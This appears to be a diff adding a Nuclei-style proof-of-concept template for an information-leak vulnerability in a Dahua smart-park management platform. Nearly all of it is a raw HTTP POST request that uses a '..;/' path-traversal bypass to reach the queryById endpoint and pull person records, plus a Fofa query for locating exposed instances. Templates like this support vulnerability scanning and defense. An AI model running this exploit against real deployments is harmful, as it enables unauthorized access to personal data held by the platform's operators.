@@ -1,0 +1,34 @@
+id: poc-ikpmp84ige9bi9fr
+info:
+  name: 大华-智慧园区综合管理平台 queryById 存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ikpmp84ige9bi9fr'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ikpmp84ige9bi9fr
+    fofa: app="dahua-智慧园区综合管理平台"
+http:
+- raw:
+  - 'POST /CardSolution/card/visitor/appointment/..;/..;/..;/card/person/queryById HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    Content-Length: 9
+
+    Content-Type: application/json
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15
+
+
+    {"id":8}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
